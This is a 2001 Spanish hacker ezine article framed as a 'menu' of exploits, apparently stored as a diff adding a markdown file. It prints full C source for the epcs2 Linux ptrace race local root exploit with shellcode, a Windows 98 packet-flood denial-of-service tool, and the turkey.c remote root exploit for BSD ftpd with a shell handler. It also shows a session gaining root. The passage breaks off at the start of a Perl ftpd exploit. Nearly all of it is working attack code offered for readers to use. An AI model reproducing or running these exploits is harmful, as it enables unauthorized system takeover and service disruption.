@@ -1,0 +1,2013 @@
+---
+title: "19-Xploits"
+ezine: "disidents"
+---
+
+# 19-Xploits
+
+**Ezine:** disidents
+
+<div className="ascii-content">
+
+```
+  ------------------------
+  * BUGS y  XPLOITS 2001 *
+  * ODISEA ENTRE LOS     *
+  * RANGOS               *
+  *           by DDiego  *
+  ------------------------
+
+Bueno vamos a ver alg·n xploit que otro probado en nuestras maquinas, que
+donadas a la ciencia las sometemos a duras pruebas, vamos a poner xploits de
+estos  tiempos aqui en inet el tiempo pasa muy rapido y un xploit deja de
+serlo en poco tiempo.
+
+Menu del dia:
+
+1║ PLATO: 9-4-2001 xploit "epcs2.c" en red hat 7.0, 6.2, kernel 2.2.14,
+2.2.18, 2.2.18ow4, 2.2.17----- root --------xploit local (demasiado bueno para
+ser cierto)
+
+2║ PLATO:  18-4-2001 xploit tipo dos (denial of service) para tus win 98 y 98SE
+
+3║ PLATO:  18-4-2001 xploits remoto ftpd en freebsd 4.0, freebsd 4.2 uno en
+perl y  otro en c todos remotos,privilegios: root
+
+4║ PLATO: 03/03/2001  (Vulnerabilidades en HTTPd v1.1 y FTPd v1.0 SlimServe)
+
+5║ PLATO 08/03/2001 Uno facilito WARFTP
+
+6║ POSTRE cgis a tako
+
+-----------------1║ PLATO:
+
+
+El primero que vamos a probar dara del 9 de abril del 2001, sirve para todas
+las distribuciones linux el archivo se llama epcs2.c, testeado en red hat
+7.0, 6.2, kernel 2.2.14, 2.2.18, 2.2.18ow4 y en el caso del equipo testeado
+2.2.17-21mdk, en la 2.4.x no rula
+Seg·n hispasec el  bug es debido a que  Existe una condici┤on  de competencia
+"race condition" que permite que un usuario haga un "ptrace()" sobre un
+proceso SETUID. Ello permite analizar su memoria y modificar su c≤digo o
+memoria para alterar su ejecuci≤n.
+
+Aqui esta la prueba, entre otras cosas esto tambien prueba que usar un xploit
+de otro lo puede hacer cualquiera, lo que verdaderamente te llena es hacer
+tu tus  propias herramientas, buscar los bugs tu mismo etc, aqui os lo dejo
+pa que disfruteis.
+
+[ddiego@localhost pruebas]# gcc -o epcs2 epcs2.c
+[ddiego@localhost pruebas]# ls
+epcs2*  epcs2.c
+[ddiego@localhost pruebas]# ./epcs2
+bug exploited successfully.
+enjoy!
+sh-2.04# whoami
+root
+sh-2.04#
+
+bueno y ahora aqui va el xploit tan esperado
+
+
+
+
+/*
+ * epcs2 (improved by lst [liquid@dqc.org])
+ * ~~~~~~~
+ * exploit for execve/ptrace race condition in Linux kernel up to 2.2.18
+ *
+ * originally by:
+ * (c) 2001 Wojciech Purczynski / cliph / &lt;wp@elzabsoft.pl>
+ *
+ * improved by:
+ * lst [liquid@dqc.org]
+ *
+ * This sploit does _not_ use brute force. It does not need that.
+ * It does only one attemt to sploit the race condition in execve.
+ * Parent process waits for a context-switch that occur after
+ * child task sleep in execve.
+ *
+ * It should work even on openwall-patched kernels (I haven't tested it).
+ *
+ * Compile it:
+ *      cc epcs.c -o epcs
+ * Usage:
+ *      ./epcs [victim]
+ *
+ * It gives instant root shell with any of a suid binaries.
+ *
+ * If it does not work, try use some methods to ensure that execve
+ * would sleep while loading binary file into memory,
+ *
+ *      i.e.: cat /usr/lib/* >/dev/null 2>&1
+ *
+ * Tested on RH 7.0 and RH 6.2 / 2.2.14 / 2.2.18 / 2.2.18ow4
+ * This exploit does not work on 2.4.x because kernel won't set suid
+ * privileges if user ptraces a binary.
+ * But it is still exploitable on these kernels.
+ *
+ * Thanks to Bulba (he made me to take a look at this bug ;) )
+ * Greetings to SigSegv team.
+ *
+ * -- d00t
+ * improved by lst [liquid@dqc.org]
+ * props to kevin for most of the work
+ *
+ * now works on stack non-exec systems with some neat trickery for the
+automated
+ * method, ie. no need to find the bss segment via objdump
+ *
+ * particularly it now rewrites the code instruction sets in the
+ * dynamic linker _start segment and continues execution from there.
+ *
+ * an aside, due to the fact that the code self-modified, it wouldnt work
+ * quite correctly on a stack non-exec system without playing directly with
+ * the bss segment (ie no regs.eip = regs.esp change).  this is much more
+ * automated.  however, do note that the previous version did not trigger
+stack
+ * non-exec warnings due to how it was operating.  note that the regs.eip =
+regs.esp
+ * method will break on stack non-exec systems.
+ *
+ * as always.. enjoy.
+ *
+ */
+
+#include &lt;stdio.h>
+#include &lt;fcntl.h>
+#include &lt;sys/types.h>
+#include &lt;signal.h>
+#include &lt;linux/user.h>
+#include &lt;sys/wait.h>
+#include &lt;limits.h>
+#include &lt;errno.h>
+#include &lt;stdlib.h>
+
+#define CS_SIGNAL SIGUSR1
+#define VICTIM "/usr/bin/passwd"
+#define SHELL "/bin/sh"
+
+/*
+ * modified simple shell code with some trickery (hand tweaks)
+ */
+char shellcode[]=
+        "\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+        "\x31\xc0\x31\xdb\xb0\x17\xcd\x80"              /* setuid(0) */
+        "\x31\xc0\xb0\x2e\xcd\x80"
+        "\x31\xc0\x50\xeb\x17\x8b\x1c\x24"              /* execve(SHELL) */
+        "\x90\x90\x90\x89\xe1\x8d\x54\x24"              /* lets be tricky */
+        "\x04\xb0\x0b\xcd\x80\x31\xc0\x89"
+        "\xc3\x40\xcd\x80\xe8\xe4\xff\xff"
+        "\xff" SHELL "\x00\x00\x00" ;                   /* pad me */
+
+volatile int cs_detector=0;
+
+void cs_sig_handler(int sig)
+{
+        cs_detector=1;
+}
+
+void do_victim(char * filename)
+{
+        while (!cs_detector) ;
+        kill(getppid(), CS_SIGNAL);
+        execl(filename, filename, NULL);
+        perror("execl");
+        exit(-1);
+}
+
+int check_execve(pid_t victim, char * filename)
+{
+        char path[PATH_MAX+1];
+        char link[PATH_MAX+1];
+        int res;
+
+        snprintf(path, sizeof(path), "/proc/%i/exe", (int)victim);
+        if (readlink(path, link, sizeof(link)-1)<0) {
+                perror("readlink");
+                return -1;
+        }
+
+        link[sizeof(link)-1]='\0';
+        res=!strcmp(link, filename);
+        if (res) fprintf(stderr, "child slept outside of execve\n");
+        return res;
+}
+
+int main(int argc, char * argv[])
+{
+        char * filename=VICTIM;
+        pid_t victim;
+        int error, i;
+        struct user_regs_struct regs;
+
+        /* take our command args if you wanna play with other progs */
+        if (argc>1) filename=argv[1];
+
+        signal(CS_SIGNAL, cs_sig_handler);
+
+        victim=fork();
+        if (victim<0) {
+                perror("fork: victim");
+                exit(-1);
+        }
+        if (victim==0) do_victim(filename);
+
+        kill(victim, CS_SIGNAL);
+        while (!cs_detector) ;
+
+        if (ptrace(PTRACE_ATTACH, victim)) {
+                perror("ptrace: PTRACE_ATTACH");
+                goto exit;
+        }
+
+        if (check_execve(victim, filename))
+                goto exit;
+
+        (void)waitpid(victim, NULL, WUNTRACED);
+        if (ptrace(PTRACE_CONT, victim, 0, 0)) {
+                perror("ptrace: PTRACE_CONT");
+                goto exit;
+        }
+
+        (void)waitpid(victim, NULL, WUNTRACED);
+
+        if (ptrace(PTRACE_GETREGS, victim, 0, &regs)) {
+                perror("ptrace: PTRACE_GETREGS");
+                goto exit;
+        }
+
+        /* make sure that last null is in there */
+        for (i=0; i<=strlen(shellcode); i+=4) {
+                if (ptrace(PTRACE_POKETEXT, victim, regs.eip+i,
+                                                    *(int*)(shellcode+i))) {
+                        perror("ptrace: PTRACE_POKETEXT");
+                        goto exit;
+                }
+        }
+
+        if (ptrace(PTRACE_SETREGS, victim, 0, &regs)) {
+                perror("ptrace: PTRACE_SETREGS");
+                goto exit;
+        }
+
+        fprintf(stderr, "bug exploited successfully.\nenjoy!\n");
+
+        if (ptrace(PTRACE_DETACH, victim, 0, 0)) {
+                perror("ptrace: PTRACE_DETACH");
+                goto exit;
+        }
+
+        (void)waitpid(victim, NULL, 0);
+        return 0;
+
+exit:
+        fprintf(stderr, "d0h! error!\n");
+        kill(victim, SIGKILL);
+        return -1;
+}
+
+
+
+/*--------------- aqui se acabo este --------------------*/
+
+
+
+
+
+
+
+
+---------------- 2║ PLATO a por el win
+
+
+
+Ahora voy a poner un ataque tipo dos (denial of service), no me gusta mucho
+este tipo de ataques pero aqui este data del 18 de Abril del 2001, escrito en
+c, para win98 y win98 SE
+[root@localhost 2]# gcc -o dos dos.c
+[root@localhost 2]# ls
+dos*  dos.c
+[root@localhost 2]# ./dos
+ERROR: usage: impalla &lt;host>
+[root@localhost 2]# ./dos 212.22.152.32
+....... y a mandar paquetes (no te pases no se juega  con estas cosas)
+
+
+/*--empieza aquφ-----------*/
+
+/*
+  Author: Auriemma Luigi &lt;kaino3@genie.it>
+
+Some months ago I have modified (very very casually for learn a bit of C)
+a program that send fragmented IGMP type 8 packets to Windows host; now my
+DoS program send random packets type, from random source. I have
+tried the DoS program only on a Win98SE and it freeze for all the DoS
+time.
+Now I have posted the source code for have comments, suggestions and
+reports from you, and I hope that someone want to test it on other machine
+and systems.
+
+*/
+
+#include &lt;stdio.h>
+#include &lt;stdlib.h>
+#include &lt;unistd.h>
+#include &lt;time.h>
+#include &lt;netdb.h>
+#include &lt;netinet/in.h>
+#include &lt;netinet/in_systm.h>
+#include &lt;netinet/ip.h>
+#include &lt;sys/socket.h>
+
+struct pack
+{
+  unsigned char pack_type;
+  unsigned char pack_code;
+  unsigned short pack_cksum;
+};
+#define ERROR(a) {printf("ERROR: %s\n", a);exit(-1);}
+u_long  resolve(char *);
+
+int main(int argc, char *argv[])
+{
+  int nsock, ctr, f;
+  char *pkt, *data;
+  struct ip *nip;
+  struct pack *npack;
+  struct sockaddr_in s_addr_in;
+  setvbuf(stdout, NULL, _IONBF, 0);
+  if(argc != 2)
+    ERROR("usage: impalla &lt;host>");
+  if((nsock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
+    ERROR("could not create raw socket");
+  pkt = malloc(1500);
+  if(!pkt)
+    ERROR("could not allocate memory");
+  memset(&s_addr_in, 0, sizeof(s_addr_in));
+  memset(pkt, 0, 1500);
+  nip = (struct ip *) pkt;
+  npack = (struct pack *) (pkt + sizeof(struct ip));
+  data = (char *)(pkt + sizeof(struct ip) + sizeof(struct pack));
+  memset(data, ctr*f, 1500-(sizeof(struct ip) + sizeof(struct pack)));
+  s_addr_in.sin_addr.s_addr = resolve(argv[1]);
+  nip->ip_v  = 4;
+  nip->ip_hl  = 5;
+  nip->ip_tos  = 0x8;
+  nip->ip_ttl  = 255;
+  nip->ip_sum  = 0;
+  nip->ip_dst.s_addr = s_addr_in.sin_addr.s_addr;
+  nip->ip_src.s_addr = s_addr_in.sin_addr.s_addr;
+  npack->pack_cksum = 0;
+  npack->pack_type = 0;
+  npack->pack_code = 0;
+  while (1)
+  {
+    memset(data, rand(), 4000);
+    nip->ip_src.s_addr = rand();
+    nip->ip_p = rand();
+    nip->ip_id = rand();
+    nip->ip_len  = rand();
+    nip->ip_off  = htons(IP_MF);
+    sendto(nsock, pkt, 1500, 0, (struct sockaddr *) &s_addr_in,
+    sizeof(s_addr_in));
+  }
+}
+u_long resolve(char *host)
+{
+  struct hostent *he;
+  u_long ret;
+  if(!(he = gethostbyname(host)))
+  {
+    herror("gethostbyname()");
+    exit(-1);
+  }
+  memcpy(&ret, he->h_addr, sizeof(he->h_addr));
+  return ret;
+}
+/*Aqui acaba*/
+
+
+
+
+
+
+
+
+
+PLATO 3║:  Vulnerabilidades con las 4  letras ROOT 18/04/2001
+
+Este problema afecta a servidores ftp  FreeBsd 4.0, FreeBsd 4.2, OpenBSD 2.8, 
+IRIX 6.5, NetBSD 1.5, Solaris 8, HPUX 11, gracias a la funcion glob() si 
+quieres saber mas de esta funcion podeis verlo en 
+http://hispasec.com/unaaldia.asp?id=901
+aqui os va el xploit para el FreeBsd 4.0
+---------------------- FreeBsd 4.0 ------------------------------------------
+
+Lo compilais y os da estas opciones
+[root@localhost 2]# ./turkey
+BSD ftpd remote exploit by fish stiqz &lt;fish@analog.org>
+usage: ./turkey [options]
+        -c      remote host to connect to
+        -o      remote port to use
+        -u      remote username
+        -p      remote password
+        -i      get the password interactively
+        -t      predefined target ("-t list" to list all targets)
+        -d      writeable directory
+        -l      shellcode address
+        -v      debug level [0-2]
+        -s      seconds to sleep after login (debugging purposes)
+        -h      display this help
+
+Ahora es hora de que juguesis vosotros
+
+/*-----------------Empieza  aqui---------------*/
+
+/*
+ * turkey.c - "gobble gobble"
+ *
+ * REMOTE ROOT EXPLOIT FOR BSD FTPD
+ *   by: fish stiqz &lt;fish@analog.org>   04/13/2001
+ *
+ * shouts: trey, dono and irc.analog.org.
+ *         German_gu (whats up? =).
+ *
+ * Notes:
+ *  Doesn't break chroot, requires an account.
+ *
+ */
+
+#include &lt;sys/types.h>
+#include &lt;sys/socket.h>
+#include &lt;netdb.h>
+#include &lt;netinet/in.h>
+#include &lt;arpa/inet.h>
+#include &lt;unistd.h>
+#include &lt;stdio.h>
+#include &lt;stdlib.h>
+#include &lt;string.h>
+#include &lt;errno.h>
+#include &lt;time.h>
+#include &lt;ctype.h>
+#include &lt;pwd.h>
+
+
+#define FTP_PORT 21
+#define MAXX(a,b) ((a) < (b) ? (b) : (a))
+
+#define NOP 0x41 /* inc %ecx, works just like a nop, easier to read */
+
+extern int errno;
+
+int debug_read;
+int debug_write;
+
+
+/*
+ * Non-ripped 45 byte bsd shellcode which does setuid(0) and execve()
+ * and does not contain any '/' characters.
+ */
+char bsdcode[] =
+"\x29\xc0\x50\xb0\x17\x50\xcd\x80"
+"\x29\xc0\x50\xbf\x66\x69\x73\x68"
+"\x29\xf6\x66\xbe\x49\x46\x31\xfe"
+"\x56\xbe\x49\x0b\x1a\x06\x31\xfe"
+"\x56\x89\xe3\x50\x54\x50\x54\x53"
+"\xb0\x3b\x50\xcd\x80";
+
+
+/* architecture structure */
+struct arch {
+    char *description;
+    char *shellcode;
+    unsigned long code_addr;
+};
+
+
+/* available targets */
+struct arch archlist[] =
+{
+    { "FreeBSD 4.0-RELEASE (FTP server (Version 6.00LS))", bsdcode, 0xbfbfc2a8 
+}
+};
+
+
+/*
+ * function prototypes.
+ */
+void *Malloc(size_t);
+void *Realloc(void *, size_t);
+char *Strdup(char *);
+int get_ip(struct in_addr *, char *);
+int tcp_connect(char *, unsigned int);
+ssize_t write_sock(int, void *, size_t);
+ssize_t read_sock(int, void *, size_t);
+int ftp_login(int, char *, char *);
+char *ftp_gethomedir(int);
+int ftp_mkdir(int, char *);
+int ftp_chdir(int, char *);
+int ftp_quit(int);
+void possibly_rooted(int);
+void send_glob(int, char *);
+char *random_string(void);
+int ftp_glob_exploit(int, char *, unsigned long, char *);
+int verify_shellcode(char *);
+void usage(char *);
+void list_targets(void);
+
+
+/*
+ * Error cheq'n wrapper for malloc.
+ */
+void *Malloc(size_t n)
+{
+    void *tmp;
+
+    if((tmp = malloc(n)) == NULL)
+    {
+        fprintf(stderr, "malloc(%u) failed! exiting...\n", n);
+        exit(EXIT_FAILURE);
+    }
+
+    return tmp;
+}
+
+
+/*
+ * Error cheq'n strdup.
+ */
+char *Strdup(char *str)
+{
+    char *s;
+
+    if((s = strdup(str)) == NULL)
+    {
+        fprintf(stderr, "strdup failed! exiting...\n");
+        exit(EXIT_FAILURE);
+    }
+
+    return s;
+}
+
+
+/*
+ * translates a host from its string representation (either in numbers
+ * and dots notation or hostname format) into its binary ip address
+ * and stores it in the in_addr struct passed in.
+ *
+ * return values: 0 on success, != 0 on failure.
+ */
+int get_ip(struct in_addr *iaddr, char *host)
+{
+    struct hostent *hp;
+
+    /* first check to see if its in num-dot format */
+    if(inet_aton(host, iaddr) != 0)
+        return 0;
+
+    /* next, do a gethostbyname */
+    if((hp = gethostbyname(host)) != NULL)
+    {
+        if(hp->h_addr_list != NULL)
+        {
+            memcpy(&iaddr->s_addr, *hp->h_addr_list, sizeof(iaddr->s_addr));
+            return 0;
+        }
+        return -1;
+    }
+
+    return -1;
+}
+
+
+/*
+ * initiates a tcp connection to the specified host (either in
+ * ip format (xxx.xxx.xxx.xxx) or as a hostname (microsoft.com)
+ * to the host's tcp port.
+ *
+ * return values:  != -1 on success, -1 on failure.
+ */
+int tcp_connect(char *host, unsigned int port)
+{
+    int sock;
+    struct sockaddr_in saddress;
+    struct in_addr *iaddr;
+
+    iaddr = Malloc(sizeof(struct in_addr));
+
+    /* write the hostname information into the in_addr structure */
+    if(get_ip(iaddr, host) != 0)
+        return -1;
+
+    saddress.sin_addr.s_addr = iaddr->s_addr;
+    saddress.sin_family      = AF_INET;
+    saddress.sin_port        = htons(port);
+
+    /* create the socket */
+    if((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
+        return -1;
+        
+    /* make the connection */
+    if(connect(sock, (struct sockaddr *) &saddress, sizeof(saddress)) != 0)
+    {
+        close(sock);
+        return -1;
+    }
+
+    /* everything succeeded, return the connected socket */
+    return sock;
+}
+
+
+/*
+ * a wrapper for write to enable us to do some debugging.
+ */
+ssize_t write_sock(int fd, void *buf, size_t count)
+{
+    unsigned int i;
+
+    if(debug_write == 1)
+    {
+        printf(" > ");
+        for(i = 0; i < count; i++)
+            printf("%c", ((char *)buf)[i]);
+        fflush(stdout);
+    }
+
+    return write(fd, buf, count);
+}
+
+
+/*
+ * a wrapper for read to enable us to some debugging.
+ */
+ssize_t read_sock(int fd, void *buf, size_t count)
+{
+    unsigned int i;
+    ssize_t r;
+
+    r = read(fd, buf, count);
+
+    if(debug_read == 1)
+    {
+        printf(" < ");
+        for(i = 0; i < r; i++)
+            printf("%c", ((char *)buf)[i]);
+        fflush(stdout);
+    }
+
+    return r;
+}
+
+
+/*
+ * FTP LOGIN function.  Issues a "USER &lt;username> and then "PASS &lt;password>"
+ * to login to the remote host and checks that command succeeded.
+ */
+int ftp_login(int sock, char *username, char *password)
+{
+    char recvbuf[256];
+    char *sendbuf;
+    int r;
+
+    /* get the header */
+    read_sock(sock, recvbuf, 255);
+
+    sendbuf = Malloc((MAXX(strlen(username), strlen(password)) + 7) *
+                     sizeof(char));
+
+    sprintf(sendbuf, "USER %s\n", username);
+
+    write_sock(sock, sendbuf, strlen(sendbuf));
+    r = read_sock(sock, recvbuf, 255);
+    recvbuf[r] = 0x0;
+
+    if(atoi(recvbuf) != 331)
+        return 0;
+
+    sprintf(sendbuf, "PASS %s\n", password);
+
+    write_sock(sock, sendbuf, strlen(sendbuf));
+    r = read_sock(sock, recvbuf, 255);
+    recvbuf[r] = 0x0;
+
+    free(sendbuf);
+
+    if(atoi(recvbuf) == 230)
+        return 1;
+
+    return 0;
+}
+
+
+/*
+ * FTP GET HOME DIR function.  Issues a "CWD ~" and "PWD" to
+ * force the ftp daemon to print our our current directory.
+ */
+char *ftp_gethomedir(int sock)
+{
+    char recvbuf[256];
+    char *homedir = NULL;
+    int r;
+
+    write_sock(sock, "CWD ~\n", 6);
+    r = read_sock(sock, recvbuf, 255);
+    recvbuf[r] = 0x0;
+
+    if(atoi(recvbuf) == 250)
+    {
+        write_sock(sock, "PWD\n", 4);
+        r = read_sock(sock, recvbuf, 255);
+        recvbuf[r] = 0x0;
+
+        if(atoi(recvbuf) == 257)
+        {
+            char *front, *back;
+
+            front = strchr(recvbuf, '"');
+            front++;
+            back = strchr(front, '"');
+        
+            homedir = Malloc((back - front) * sizeof(char));
+            strncpy(homedir, front, (back - front));
+            homedir[(back - front)] = 0x0;
+        }
+    }
+
+    return homedir;
+}
+
+
+/*
+ * FTP MKDIR function.  Issues an "MKD &lt;dirname>" to create a directory on
+ * the remote host and checks that the command succeeded.
+ */
+int ftp_mkdir(int sock, char *dirname)
+{
+    char recvbuf[512];
+    char *sendbuf;
+    int r;
+
+    sendbuf = Malloc((strlen(dirname) + 6) * sizeof(char));
+    sprintf(sendbuf, "MKD %s\n", dirname);
+
+    write_sock(sock, sendbuf, strlen(sendbuf));
+    r = read_sock(sock, recvbuf, 511);
+    recvbuf[r] = 0x0;
+
+    free(sendbuf);
+
+    if(atoi(recvbuf) == 257)
+        return 1;
+
+    return 0;
+}
+
+
+/*
+ * FTP CWD function.  Issues a "CWD &lt;dirname>" to change directory on
+ * the remote host and checks that the command succeeded.
+ */
+int ftp_chdir(int sock, char *dirname)
+{
+    char recvbuf[512];
+    char *sendbuf;
+    int r;
+
+    sendbuf = Malloc((strlen(dirname) + 6) * sizeof(char));
+    sprintf(sendbuf, "CWD %s\n", dirname);
+
+    write_sock(sock, sendbuf, strlen(sendbuf));
+    r = read_sock(sock, recvbuf, 511);
+    recvbuf[r] = 0x0;
+
+    free(sendbuf);
+
+    if(atoi(recvbuf) == 250)
+        return 1;
+
+    return 0;
+}
+
+
+/*
+ * FTP QUIT function.  Issues a "QUIT" to terminate the connection.
+ */
+int ftp_quit(int sock)
+{
+    char recvbuf[256];
+    int r;
+
+    write_sock(sock, "QUIT\n", 5);
+    r = read_sock(sock, recvbuf, 255);
+    recvbuf[r] = 0x0;
+
+    close(sock);
+    return 1;
+}
+
+/*
+ * switches between the user and the remote shell (if everything went well).
+ */
+void possible_shell(int sock)
+{
+    char banner[] =
+        "cd /; echo; uname -a; echo; id; echo; echo Welcome to the shell, "
+        "enter commands at will; echo;\n\n";
+        
+    char buf[1024];
+    fd_set fds;
+    int r;
+
+    write(sock, banner, strlen(banner));
+
+    for(;;)
+    {
+        FD_ZERO(&fds);
+        FD_SET(fileno(stdin), &fds);
+        FD_SET(sock, &fds);
+        select(255, &fds, NULL, NULL, NULL);
+
+        if(FD_ISSET(sock, &fds))
+        {
+            memset(buf, 0x0, sizeof(buf));
+            r = read (sock, buf, sizeof(buf) - 1);
+            if(r <= 0)
+            {
+                printf("Connection closed.\n");
+                exit(EXIT_SUCCESS);
+            }
+            printf("%s", buf);
+        }
+
+        if(FD_ISSET(fileno(stdin), &fds))
+        {
+            memset(buf, 0x0, sizeof(buf));
+            read(fileno(stdin), buf, sizeof(buf) - 1);
+            write(sock, buf, strlen(buf));
+        }
+    }
+    close(sock);
+}
+
+
+/*
+ * generates a string of 6 random characters.
+ * this is too allow for multiple successful runs, best way to do
+ * this is to actually remove the created directories.
+ */
+char *random_string(void)
+{
+    int i;
+    char *s = Malloc(7);
+
+    srand(time(NULL));
+    for(i = 0; i < 6; i++)
+        s[i] = (rand() % (122 - 97)) + 97;
+
+    s[i] = 0x0;
+    return s;
+}
+
+
+/*
+ * sends the glob string, to overflow the daemon.
+ */
+void send_glob(int sock, char *front)
+{
+    char globbed[] = "CWD ~/NNNNNN*/X*/X*/X*\n";
+    int i, j;
+
+    for(i = 6, j = 0; i < 6 + 6; i++, j++)
+        globbed[i] = front[j];
+
+    write_sock(sock, globbed, strlen(globbed));
+
+    printf("[5] Globbed commands sent.\n");
+
+    /* start our shell handler */
+    possible_shell(sock);
+}
+
+
+/*
+ * Exploitation routine.
+ * Makes 4 large directories and then cwd's to them.
+ */
+int ftp_glob_exploit(int sock, char *homedir, unsigned long addy, char 
+*shellcode)
+{
+    char dir[300];
+    int i, j;
+    int total = strlen(homedir) + 1;
+    int align2;
+    char *rstring = random_string();
+
+    /* go to the writeable directory */
+    if(!ftp_chdir(sock, homedir))
+    {
+        fprintf(stderr, "[-] Failed to change directory, aborting!\n");
+        return 0;
+    }
+
+    for(i = 0; i < 4; i++)
+    {
+        memset(dir, 0x0, 299);
+
+        switch(i)
+        {
+        case 0: /* first dir == shellcode */
+            memcpy(dir, rstring, strlen(rstring));
+            memset(dir + strlen(rstring), NOP, 255 - strlen(rstring));
+            strcpy(&dir[(255 - strlen(shellcode))], shellcode);
+            break;
+
+        case 3: /* address buffer */
+            /* calculate the alignment */
+            align2 = total % sizeof(long);
+            align2 = sizeof(long) - align2;
+
+            printf("[3] Calculated alignment = %d, total = %d\n",
+                   align2, total);
+
+            strcpy(dir, "XXXX");
+            memset(dir + 4, 'X', align2);
+        
+            for(j = 4 + align2; j < 250; j += 4)
+                *(unsigned long *)(&dir[j]) = addy;
+            break;
+        
+        default: /* cases 1 and 2, extra overflow bytes */
+            memset(dir, 'X', 255);
+            break;
+
+        }
+
+        total += strlen(dir) + 1;
+
+        if(!ftp_mkdir(sock, dir))
+        {
+            fprintf(stderr, "[-] Failed to generate directories, aborting!\n");
+            return 0;
+        }
+        
+        if(!ftp_chdir(sock, dir))
+        {
+            fprintf(stderr, "[-] Failed to change directory, aborting!\n");
+            return 0;
+        }
+    }
+
+    printf("[4] Evil directories created.\n");
+
+    if(!ftp_chdir(sock, homedir))
+    {
+        fprintf(stderr, "[-] Failed to cwd back to %s, aborting!\n", homedir);
+        return 0;
+    }
+
+    /* perform the final attack */
+    send_glob(sock, rstring);
+
+    return 1;
+}
+
+
+/*
+ * returns true if the shellcode passes, false otherwise.
+ */
+int verify_shellcode(char *code)
+{
+    int i, s = 0;
+
+    if(strlen(code) > 255)
+    {
+        fprintf(stderr, "[-] Shellcode length exceeds 255, aborting!\n");
+        return 0;
+    }
+
+    for(i = 0; i < strlen(code); i++)
+    {
+        if(code[i] == '/')
+            s++;
+    }
+
+    if(s > 0)
+    {
+        fprintf(stderr,
+                "[-] Shellcode contains %u slash characters, aborting\n", s);
+        return 0;
+    }
+
+    return 1;
+}
+
+
+/*
+ * displays the usage message and exits.
+ */
+void usage(char *p)
+{
+    fprintf(stderr,
+            "BSD ftpd remote exploit by fish stiqz &lt;fish@analog.org>\n"
+            "usage: %s [options]\n"
+            "\t-c\tremote host to connect to\n"
+            "\t-o\tremote port to use\n"
+            "\t-u\tremote username\n"
+            "\t-p\tremote password\n"
+            "\t-i\tget the password interactively\n"
+            "\t-t\tpredefined target (\"-t list\" to list all targets)\n"
+            "\t-d\twriteable directory\n"
+            "\t-l\tshellcode address\n"
+            "\t-v\tdebug level [0-2]\n"
+            "\t-s\tseconds to sleep after login (debugging purposes)\n"
+            "\t-h\tdisplay this help\n", p);
+
+    exit(EXIT_FAILURE);
+}
+
+/*
+ * lists all available targets.
+ */
+void list_targets(void)
+{
+    int i;
+
+    printf("Available Targets:\n");
+
+    for(i = 0; i < sizeof(archlist) / sizeof(struct arch); i++ )
+        printf("%i: %s\n", i, archlist[i].description);
+
+    return;
+}
+
+
+int main(int argc, char **argv)
+{
+    int sock, c;
+    int port       = FTP_PORT;
+    int debuglevel = 0;
+    char *host     = NULL;
+    char *username = NULL;
+    char *password = NULL;
+
+    struct arch *arch       = NULL;
+    char *shellcode         = bsdcode;
+    int target              = 0;
+    int sleep_time          = 0;
+    unsigned long code_addr = 0;
+    char *homedir           = NULL;;
+
+    /* grab command line parameters */
+    while((c = getopt(argc, argv, "c:o:u:p:it:d:l:v:s:h")) != EOF)
+    {
+        switch(c)
+        {
+        case 'c':
+            host = Strdup(optarg);
+            break;
+
+        case 'o':
+            port = atoi(optarg);
+            break;
+        
+        case 'u':
+            username = Strdup(optarg);
+            break;
+        
+        case 'p':
+            password = Strdup(optarg);
+            /* hide the password from ps */
+            memset(optarg, 'X', strlen(optarg));
+            break;
+
+        case 'i':
+            password = getpass("Enter remote password: ");
+            break;
+
+        case 't':
+            if(strcmp(optarg, "list") == 0)
+            {
+                list_targets();
+                return EXIT_FAILURE;
+            }
+        
+            target = atoi(optarg);
+            arch = &(archlist[target]);
+            code_addr = arch->code_addr;
+            shellcode = arch->shellcode;
+            break;
+
+        case 'd':
+            homedir = Strdup(optarg);
+            break;
+
+        case 'l':
+            code_addr = strtoul(optarg, NULL, 0);
+            break;
+
+        case 'v':
+            debuglevel = atoi(optarg);
+            break;
+
+        case 's':
+            sleep_time = atoi(optarg);
+            break;
+
+        default:
+            usage(argv[0]);
+            break;
+        }
+    }
+
+
+    /* check for required options */
+    if(host == NULL || username == NULL || password == NULL || code_addr == 0)
+        usage(argv[0]);
+
+    /* setup the debug level */
+    switch(debuglevel)
+    {
+    case 1:
+        debug_read = 1;
+        debug_write = 0;
+        break;
+
+    case 2:
+        debug_read = 1;
+        debug_write = 1;
+        break;
+        
+    default:
+        debug_read = 0;
+        debug_write = 0;
+        break;
+    }
+
+    /* make sure the shellcode is good */
+    if(!verify_shellcode(shellcode))
+        return EXIT_FAILURE;
+        
+    /* initiate the tcp connection to the ftp server */
+    if((sock = tcp_connect(host, port)) == -1)
+    {
+        fprintf(stderr, "[-] Connection to %s failed!\n", host);
+        ftp_quit(sock);
+        return EXIT_FAILURE;
+    }
+
+    if(arch == NULL)
+        printf("[0] Connected to host %s.\n", host);
+    else
+        printf("[0] Connected to host %s\n\tAs type %s.\n",
+               host, arch->description);
+
+
+    /* login */
+    if(!ftp_login(sock, username, password))
+    {
+        fprintf(stderr, "[-] Login failed, aborting!\n");
+        ftp_quit(sock);
+        return EXIT_FAILURE;
+    }
+
+    /* hey, so im anal! */
+    memset(password, 0x0, strlen(password));
+    free(username);
+    free(password);
+
+    printf("[1] Login succeeded.\n");
+
+    if(sleep != 0)
+        sleep(sleep_time);
+
+    if(homedir == NULL)
+    {
+        /* get home directory */
+        if((homedir = ftp_gethomedir(sock)) == NULL)
+        {
+            fprintf(stderr, "[-] Couldn't retrieve home directory, 
+aborting!\n");
+            ftp_quit(sock);
+            return EXIT_FAILURE;
+        }
+    }
+        
+    printf("[2] Home directory retrieved as \"%s\", %u bytes.\n",
+               homedir, strlen(homedir));
+
+    /* do the exploitation */
+    if(!ftp_glob_exploit(sock, homedir, code_addr, shellcode))
+    {
+        fprintf(stderr, "[-] exploit failed, aborting!\n");
+        ftp_quit(sock);
+        return EXIT_FAILURE;
+    }
+
+    ftp_quit(sock);
+
+    free(host);
+    return EXIT_SUCCESS;
+}
+
+
+/*---------Acaba aqui----------------------------*/
+ 
+
+---------------------------FreeBsd 4.2 globulka.pl---------------------------
+
+#--------------------Empieza aqui
+
+
+
+#!/usr/bin/perl
+
+# This is another version of globbing exploit, written about week ago. It
+# creates only one directory.
+
+
+###############################################################################
+# glob() ftpd remote root exploit for freebsd 4.2-stable                      #
+#                                                                             #
+# babcia padlina ltd. / venglin@freebsd.lublin.pl                             #
+#                                                                             #
